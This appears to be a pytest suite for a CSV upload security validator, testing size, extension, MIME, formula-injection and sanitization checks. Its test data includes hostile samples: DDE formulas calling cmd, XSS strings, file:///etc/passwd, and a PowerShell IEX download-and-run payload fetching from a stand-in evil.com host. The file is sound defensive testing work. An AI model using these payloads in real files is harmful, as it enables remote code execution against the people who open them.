"""
Comprehensive security tests for CSV upload functionality
Tests formula injection prevention, file validation, and sanitization
"""

from unittest.mock import patch

import pytest

from app.security.csv_security import (
    CSVSecurityError,
    CSVSecurityValidator,
)


@pytest.mark.security
@pytest.mark.unit
class TestCSVSecurityValidator:
    """Test CSV security validation functionality"""

    def test_file_size_validation(self):
        """Test file size validation prevents large files"""
        validator = CSVSecurityValidator()

        # Test normal size file
        normal_content = b"sku,name,price\nTEST-001,Test Product,2.50"
        result = validator.validate_file_upload(normal_content, "test.csv")
        assert result["valid"] is True

        # Test oversized file
        large_content = b"x" * (validator.MAX_FILE_SIZE + 1)
        with pytest.raises(CSVSecurityError) as exc_info:
            validator.validate_file_upload(large_content, "large.csv")
        assert "File too large" in str(exc_info.value)

    def test_file_extension_validation(self):
        """Test file extension validation"""
        validator = CSVSecurityValidator()

        # Valid extensions
        valid_content = b"sku,name\nTEST-001,Test"
        result = validator.validate_file_upload(valid_content, "test.csv")
        assert result["valid"] is True

        result = validator.validate_file_upload(valid_content, "test.txt")
        assert result["valid"] is True

        # Invalid extension
        with pytest.raises(CSVSecurityError) as exc_info:
            validator.validate_file_upload(valid_content, "test.exe")
        assert "Invalid file extension" in str(exc_info.value)

    def test_mime_type_validation(self):
        """Test MIME type validation with python-magic"""
        validator = CSVSecurityValidator()
        csv_content = b"sku,name,price\nTEST-001,Test Product,2.50"

        with patch("magic.from_buffer") as mock_magic:
            # Test valid MIME type
            mock_magic.return_value = "text/csv"
            result = validator.validate_file_upload(csv_content, "test.csv")
            assert result["valid"] is True
            assert len(result["warnings"]) == 0

            # Test suspicious MIME type
            mock_magic.return_value = "application/octet-stream"
            result = validator.validate_file_upload(csv_content, "test.csv")
            assert result["valid"] is True
            assert len(result["warnings"]) > 0
            assert "Unexpected MIME type" in result["warnings"][0]

    def test_content_structure_validation(self):
        """Test CSV content structure validation"""
        validator = CSVSecurityValidator()

        # Test normal content
        normal_content = b"sku,name,price\nTEST-001,Test Product,2.50"
        result = validator.validate_file_upload(normal_content, "test.csv")
        assert result["valid"] is True
        assert result["file_info"]["estimated_rows"] == 2

        # Test too many rows
        many_rows = b"sku,name\n" + b"\n".join(
            [f"SKU-{i},Product {i}".encode() for i in range(validator.MAX_ROWS + 1)]
        )
        with pytest.raises(CSVSecurityError) as exc_info:
            validator.validate_file_upload(many_rows, "test.csv")
        assert "Too many rows" in str(exc_info.value)

        # Test extremely long line
        long_line = b"sku,name\nTEST-001," + b"x" * (validator.MAX_FIELD_LENGTH + 1)
        with pytest.raises(CSVSecurityError) as exc_info:
            validator.validate_file_upload(long_line, "test.csv")
        assert "too long" in str(exc_info.value)

    def test_formula_injection_detection(self):
        """Test detection of formula injection attacks"""
        validator = CSVSecurityValidator()

        # Test various formula injection patterns
        malicious_patterns = [
            b"sku,formula\nTEST-001,=2+2",
            b"sku,formula\nTEST-001,+2+2",
            b'sku,formula\nTEST-001,=DDE("cmd","/c calc.exe")',
            b"sku,formula\nTEST-001,@SUM(1+1)",
            b"sku,script\nTEST-001,<script>alert('xss')</script>",
            b"sku,js\nTEST-001,javascript:alert('test')",
        ]

        for malicious_content in malicious_patterns:
            result = validator.validate_file_upload(malicious_content, "test.csv")
            assert len(result["security_issues"]) > 0, (
                f"Failed to detect threat in: {malicious_content}"
            )

    def test_suspicious_url_detection(self):
        """Test detection of suspicious URLs"""
        validator = CSVSecurityValidator()

        suspicious_urls = [
            b"sku,url\nTEST-001,https://evil.com/malware.exe",
            b"sku,url\nTEST-001,ftp://malicious.site/data.txt",
            b"sku,url\nTEST-001,file:///etc/passwd",
        ]

        for suspicious_content in suspicious_urls:
            result = validator.validate_file_upload(suspicious_content, "test.csv")
            assert len(result["security_issues"]) > 0, (
                f"Failed to detect suspicious URL in: {suspicious_content}"
            )


@pytest.mark.security
@pytest.mark.unit
class TestCSVSanitization:
    """Test CSV content sanitization functionality"""

    def test_formula_prefix_sanitization(self, malicious_csv_content):
        """Test sanitization of formula prefixes"""
        validator = CSVSecurityValidator()

        sanitized_content, changes = validator.sanitize_csv_content(
            malicious_csv_content
        )

        # Check that dangerous prefixes were neutralized
        assert "=2+2" not in sanitized_content
        assert "'+2+2" in sanitized_content or "'=2+2" in sanitized_content
        assert len(changes) > 0
        assert any("Formula prefix" in change for change in changes)

    def test_dde_function_sanitization(self):
        """Test sanitization of DDE and CMD functions"""
        validator = CSVSecurityValidator()

        malicious_content = 'sku,command\nTEST-001,=DDE("cmd","/c calc.exe")'
        sanitized_content, changes = validator.sanitize_csv_content(malicious_content)

        # DDE should be neutralized
        assert 'DDE("cmd"' not in sanitized_content
        assert "'DDE(" in sanitized_content
        assert any("DDE/CMD function neutralized" in change for change in changes)

    def test_javascript_url_sanitization(self):
        """Test sanitization of JavaScript URLs"""
        validator = CSVSecurityValidator()

        malicious_content = "sku,url\nTEST-001,javascript:alert('xss')"
        sanitized_content, changes = validator.sanitize_csv_content(malicious_content)

        # JavaScript URL should be neutralized
        assert "javascript:" not in sanitized_content
        assert "javascript_" in sanitized_content
        assert any("JavaScript URL sanitized" in change for change in changes)

    def test_field_length_truncation(self):
        """Test field length truncation for security"""
        validator = CSVSecurityValidator()

        long_field = "x" * (validator.MAX_FIELD_LENGTH + 100)
        malicious_content = f"sku,long_field\nTEST-001,{long_field}"
        sanitized_content, changes = validator.sanitize_csv_content(malicious_content)

        # Field should be truncated
        assert "[TRUNCATED]" in sanitized_content
        assert len(sanitized_content) < len(malicious_content)
        assert any("Field truncated" in change for change in changes)

    def test_csv_field_parsing(self):
        """Test CSV field parsing handles quoted fields correctly"""
        validator = CSVSecurityValidator()

        # Test quoted fields with commas
        fields = validator._parse_csv_fields('TEST-001,"Product with, comma"')

        assert len(fields) == 2
        assert fields[0] == "TEST-001"
        assert fields[1] == '"Product with, comma"'

    def test_sanitize_field_preserves_quotes(self):
        """Test field sanitization preserves necessary quotes"""
        validator = CSVSecurityValidator()

        # Test field with comma that needs quotes
        field_with_comma = '"Product, with comma"'
        sanitized_field, changes = validator._sanitize_field(field_with_comma)

        # Should preserve quotes for fields with commas
        assert sanitized_field.startswith('"') and sanitized_field.endswith('"')

    def test_comprehensive_sanitization(self):
        """Test comprehensive sanitization with multiple threats"""
        validator = CSVSecurityValidator()

        malicious_content = """sku,formula,script,url
TEST-001,=2+2,<script>alert('xss')</script>,javascript:alert('test')
TEST-002,=DDE("cmd","/c calc"),+5+5,https://evil.com/malware.exe
TEST-003,@SUM(1+1),"=1+1, with comma",file:///etc/passwd"""

        sanitized_content, changes = validator.sanitize_csv_content(malicious_content)

        # Verify all threats were neutralized
        dangerous_patterns = ["=2+2", "=DDE(", "<script>", "javascript:", "@SUM("]
        for pattern in dangerous_patterns:
            assert pattern not in sanitized_content, (
                f"Pattern {pattern} was not sanitized"
            )

        # Verify changes were logged
        assert len(changes) > 0
        change_types = ["Formula prefix", "DDE/CMD function", "JavaScript URL"]
        for change_type in change_types:
            assert any(change_type in change for change in changes)


@pytest.mark.security
@pytest.mark.integration
class TestCSVUploadEndpointSecurity:
    """Test CSV upload endpoint security integration"""

    @pytest.mark.asyncio
    async def test_csv_upload_security_validation(
        self, async_client, mock_api_key_auth, malicious_csv_content
    ):
        """Test CSV upload endpoint validates and sanitizes uploads"""

        # Mock file upload
        files = {"file": ("malicious.csv", malicious_csv_content.encode(), "text/csv")}

        with patch(
            "app.security.csv_security.validate_and_sanitize_csv"
        ) as mock_validate:
            mock_validate.return_value = {
                "validation": {
                    "valid": True,
                    "security_issues": ["Formula injection detected"],
                },
                "sanitized_content": "sanitized content",
                "sanitization_changes": ["Formula prefix neutralized"],
                "security_status": "sanitized",
            }

            response = await async_client.post("/api/v1/csv-upload", files=files)

            # Should accept the file but indicate it was sanitized
            if response.status_code == 200:
                data = response.json()
                assert data.get("security_status") == "sanitized"
                assert len(data.get("sanitization_changes", [])) > 0

    @pytest.mark.asyncio
    async def test_csv_upload_rejects_dangerous_files(
        self, async_client, mock_api_key_auth
    ):
        """Test CSV upload rejects extremely dangerous files"""

        # Extremely malicious content that should be rejected
        extremely_malicious = b"""sku,malicious_payload
TEST-001,=DDE("cmd","/c powershell -ExecutionPolicy Bypass -Command \\"IEX (New-Object Net.WebClient).DownloadString('https://evil.com/malware.ps1')\\"")"""

        files = {"file": ("dangerous.csv", extremely_malicious, "text/csv")}

        response = await async_client.post("/api/v1/csv-upload", files=files)

        # Should either reject or heavily sanitize
        assert response.status_code in [200, 400, 422]
        if response.status_code == 200:
            data = response.json()
            assert data.get("security_status") in ["sanitized", "rejected"]

    @pytest.mark.asyncio
    async def test_csv_upload_file_size_limits(self, async_client, mock_api_key_auth):
        """Test CSV upload enforces file size limits"""

        # Create oversized file content
        oversized_content = (
            b"sku,name\n" + b"TEST-001,Product\n" * 100000
        )  # Very large file
        files = {"file": ("large.csv", oversized_content, "text/csv")}

        response = await async_client.post("/api/v1/csv-upload", files=files)

        # Should reject oversized files
        assert response.status_code in [
            400,
            413,
            422,
        ]  # Bad Request, Payload Too Large, or Unprocessable Entity

    @pytest.mark.asyncio
    async def test_csv_upload_invalid_file_types(self, async_client, mock_api_key_auth):
        """Test CSV upload rejects invalid file types"""

        invalid_files = [
            ("malware.exe", b"MZ\x90\x00", "application/octet-stream"),
            ("script.js", b"alert('xss');", "application/javascript"),
            ("image.png", b"\x89PNG\r\n\x1a\n", "image/png"),
        ]

        for filename, content, mimetype in invalid_files:
            files = {"file": (filename, content, mimetype)}
            response = await async_client.post("/api/v1/csv-upload", files=files)

            # Should reject non-CSV files
            assert response.status_code in [400, 415, 422], (
                f"Failed to reject {filename}"
            )


@pytest.mark.security
@pytest.mark.unit
class TestCSVSecurityEdgeCases:
    """Test CSV security edge cases and boundary conditions"""

    def test_empty_file_handling(self):
        """Test handling of empty files"""
        validator = CSVSecurityValidator()

        empty_content = b""
        result = validator.validate_file_upload(empty_content, "empty.csv")
        assert result["valid"] is True
        assert result["file_info"]["estimated_rows"] == 0

    def test_unicode_content_handling(self):
        """Test handling of Unicode content"""
        validator = CSVSecurityValidator()

        # Test UTF-8 with BOM
        unicode_content = "\ufeffsku,name,价格\nTEST-001,产品,2.50".encode("utf-8-sig")
        result = validator.validate_file_upload(unicode_content, "unicode.csv")
        assert result["valid"] is True

        # Test Latin-1 encoding
        latin_content = "sku,name,café\nTEST-001,Product,2.50".encode("latin1")
        result = validator.validate_file_upload(latin_content, "latin.csv")
        assert result["valid"] is True

    def test_malformed_csv_handling(self):
        """Test handling of malformed CSV content"""
        validator = CSVSecurityValidator()

        malformed_csv = b"""sku,name,price
TEST-001,"Unclosed quote,2.50
TEST-002,Normal Product,3.00"""

        # Should not crash on malformed CSV
        result = validator.validate_file_upload(malformed_csv, "malformed.csv")
        assert result["valid"] is True  # Validation should still pass

    def test_nested_formula_injection(self):
        """Test detection of nested and obfuscated formula injections"""
        validator = CSVSecurityValidator()

        nested_formulas = [
            b'sku,nested\nTEST-001,"=1+1"',  # Formula in quotes
            b"sku,whitespace\nTEST-001, =2+2",  # Formula with leading whitespace
            b"sku,tab\nTEST-001,\t=3+3",  # Formula with tab
            b"sku,newline\nTEST-001,\n=4+4",  # Formula with newline
        ]

        for nested_formula in nested_formulas:
            result = validator.validate_file_upload(nested_formula, "nested.csv")
            # Should detect at least some of these patterns
            if len(result["security_issues"]) == 0:
                # If validation doesn't catch it, sanitization should
                content_str = nested_formula.decode("utf-8")
                sanitized_content, changes = validator.sanitize_csv_content(content_str)
                assert len(changes) > 0 or "=" not in sanitized_content.split("\n")[-1]

    def test_multiple_encoding_attacks(self):
        """Test handling of multiple encoding attack vectors"""
        validator = CSVSecurityValidator()

        # Test URL encoding
        url_encoded = b"sku,encoded\nTEST-001,%3Dscript%3Aalert('xss')%3C/script%3E"
        result = validator.validate_file_upload(url_encoded, "encoded.csv")
        assert result["valid"] is True  # Should handle gracefully

        # Test HTML entities
        html_entities = (
            b"sku,entities\nTEST-001,&lt;script&gt;alert('xss')&lt;/script&gt;"
        )
        result = validator.validate_file_upload(html_entities, "entities.csv")
        assert result["valid"] is True

    def test_performance_with_large_valid_file(self):
        """Test performance doesn't degrade with large valid files"""
        validator = CSVSecurityValidator()

        # Create large but valid CSV
        large_csv_lines = ["sku,name,price"]
        for i in range(10000):  # 10k rows - within limits
            large_csv_lines.append(f"SKU-{i:05d},Product {i},2.50")

        large_csv_content = "\n".join(large_csv_lines).encode("utf-8")

        import time

        start_time = time.time()
        result = validator.validate_file_upload(large_csv_content, "large_valid.csv")
        end_time = time.time()

        assert result["valid"] is True
        assert (end_time - start_time) < 5.0  # Should complete within 5 seconds

    def test_sanitization_preserves_data_integrity(self):
        """Test that sanitization preserves legitimate data"""
        validator = CSVSecurityValidator()

        legitimate_content = """sku,name,description,price
TEST-001,Product 1,"High-quality product, best in class",2.50
TEST-002,Product 2,Normal product with + sign in description,3.00
TEST-003,Product 3,Email: contact@company.com,1.75"""

        sanitized_content, changes = validator.sanitize_csv_content(legitimate_content)

        # Should preserve legitimate data
        assert "Product 1" in sanitized_content
        assert "contact@company.com" in sanitized_content
        assert "2.50" in sanitized_content

        # Should not have made unnecessary changes to legitimate data
        [change for change in changes if "Formula prefix" not in change]
        # Some changes might be acceptable (like quote handling), but should be minimal


@pytest.mark.security
@pytest.mark.performance
class TestCSVSecurityPerformance:
    """Test CSV security performance under various conditions"""

    def test_validation_performance_under_load(self):
        """Test validation performance with multiple concurrent requests"""
        validator = CSVSecurityValidator()

        test_content = b"sku,name,price\nTEST-001,Product,2.50"

        import threading
        import time

        results = []
        errors = []

        def validate_file():
            try:
                start_time = time.time()
                validator.validate_file_upload(test_content, "test.csv")
                end_time = time.time()
                results.append(end_time - start_time)
            except Exception as e:
                errors.append(e)

        # Run 10 concurrent validations
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=validate_file)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        assert len(errors) == 0, f"Validation errors under load: {errors}"
        assert len(results) == 10
        assert all(duration < 1.0 for duration in results), (
            "Validation too slow under load"
        )

    def test_memory_usage_with_large_files(self):
        """Test memory usage doesn't grow excessively with large files"""
        validator = CSVSecurityValidator()

        # Create progressively larger files and ensure memory usage is reasonable
        import os

        import psutil

        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss

        for size_factor in [1, 10, 100]:  # Test with increasing sizes
            csv_lines = ["sku,name,price"]
            for i in range(1000 * size_factor):
                csv_lines.append(f"SKU-{i:05d},Product {i},2.50")

            large_content = "\n".join(csv_lines).encode("utf-8")

            # Validate the file
            result = validator.validate_file_upload(
                large_content, f"large_{size_factor}.csv"
            )
            assert result["valid"] is True

            # Check memory usage
            current_memory = process.memory_info().rss
            memory_growth_mb = (current_memory - initial_memory) / (1024 * 1024)

            # Memory growth should be reasonable (less than 100MB for test files)
            assert memory_growth_mb < 100, (
                f"Excessive memory growth: {memory_growth_mb:.1f}MB"
            )
